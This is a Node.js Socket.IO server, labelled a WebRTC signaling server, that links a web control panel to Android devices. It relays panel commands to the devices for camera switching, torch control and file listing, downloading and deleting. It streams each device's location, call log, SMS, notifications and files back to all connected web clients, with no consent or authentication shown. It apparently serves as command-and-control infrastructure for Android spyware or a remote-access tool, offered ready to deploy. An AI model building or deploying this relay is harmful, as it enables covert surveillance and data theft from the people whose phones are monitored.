/**
 * server.js — WebRTC Signaling Server
 * Runs on Render.com (Node.js)
 *
 * CORS: allows connections from your PHP web panel host.
 * Edit the ALLOWED_ORIGINS array below to add your PHP host domain.
 */

const express   = require('express');
const http      = require('http');
const { Server } = require('socket.io');
const path      = require('path');

const app    = express();
const server = http.createServer(app);

// ─────────────────────────────────────────────────────────────────────────────
// CORS — Add your PHP web panel domain here
// Examples: 'https://yourdomain.com', 'https://mypanel.xyz'
// ─────────────────────────────────────────────────────────────────────────────
const ALLOWED_ORIGINS = [
    'https://yourdomain.com',        // ← replace with your PHP host domain
    'http://localhost',
    'http://localhost:3000',
    'http://127.0.0.1',
    'http://127.0.0.1:3000',
    /.*\.onrender\.com$/,            // allow any Render subdomain (for testing)
];

const io = new Server(server, {
    cors: {
        origin: (origin, cb) => {
            // Allow requests with no origin (mobile apps, curl, etc.)
            if (!origin) return cb(null, true);
            const allowed = ALLOWED_ORIGINS.some(o =>
                o instanceof RegExp ? o.test(origin) : o === origin
            );
            cb(allowed ? null : new Error('CORS blocked: '+origin), allowed);
        },
        methods: ['GET', 'POST'],
        credentials: false,
    },
    transports: ['websocket', 'polling'],
});

const PORT = process.env.PORT || 3000;

// Serve the public folder (socket.io.js is auto-served by socket.io itself)
app.use(express.static(path.join(__dirname, 'public')));

// Health check endpoint
app.get('/health', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));

// ─────────────────────────────────────────────────────────────────────────────
// Socket.IO
// ─────────────────────────────────────────────────────────────────────────────
io.on('connection', (socket) => {
    console.log('[+] Connected:', socket.id);

    // ── Role identification ──────────────────────────────────────────────────
    socket.on('identify', (role) => {
        socket._role = role;
        console.log(`[role] ${socket.id} -> ${role}`);

        if (role === 'android') {
            socket.join('android');
            // Notify all web clients a new android device is online
            io.to('web').emit('android-device-connected', {
                socketId: socket.id,
                name:     'Device-' + socket.id.substring(0, 6),
                online:   true,
            });
            // Tell android if any web client is already waiting
            const webSockets = [...io.sockets.sockets.values()]
                .filter(s => s._role === 'web');
            if (webSockets.length > 0) {
                socket.emit('web-client-ready', webSockets[0].id);
            }
        }

        if (role === 'web') {
            socket.join('web');
            // Send current android device list to this new web client
            const androidList = [...io.sockets.sockets.values()]
                .filter(s => s._role === 'android')
                .map(s => ({
                    socketId: s.id,
                    name:     'Device-' + s.id.substring(0, 6),
                    online:   true,
                }));
            socket.emit('device-list', androidList);
            // Tell all androids a web client is ready
            socket.broadcast.to('android').emit('web-client-ready', socket.id);
        }
    });

    // ── WebRTC signal relay ──────────────────────────────────────────────────
    socket.on('signal', (msg) => {
        const target = io.sockets.sockets.get(msg.to);
        if (target) target.emit('signal', { ...msg, from: socket.id });
    });

    // ── Commands: web -> android ─────────────────────────────────────────────
    ['torch', 'switch_camera', 'fs:list', 'fs:download',
     'fs:download_ready', 'fs:delete', 'sync_data'].forEach(event => {
        socket.on(event, (data) => {
            const target = io.sockets.sockets.get(data.to);
            if (target) target.emit(event, { ...data, from: socket.id });
        });
    });

    // ── Data events: android -> web ──────────────────────────────────────────
    ['location', 'call_log', 'sms', 'notification',
     'fs:files', 'fs:download_start', 'fs:download_chunk',
     'fs:download_complete', 'fs:download_error'].forEach(event => {
        socket.on(event, (data) => {
            io.to('web').emit(event, { ...data, from: socket.id });
        });
    });

    // ── Disconnect ───────────────────────────────────────────────────────────
    socket.on('disconnect', () => {
        console.log('[-] Disconnected:', socket.id, '| role:', socket._role||'unknown');
        io.to('web').emit('android-device-disconnected',   { socketId: socket.id });
        io.to('android').emit('web-client-disconnected',   socket.id);
    });
});

server.listen(PORT, () => {
    console.log(`✅ Signaling server running on port ${PORT}`);
});
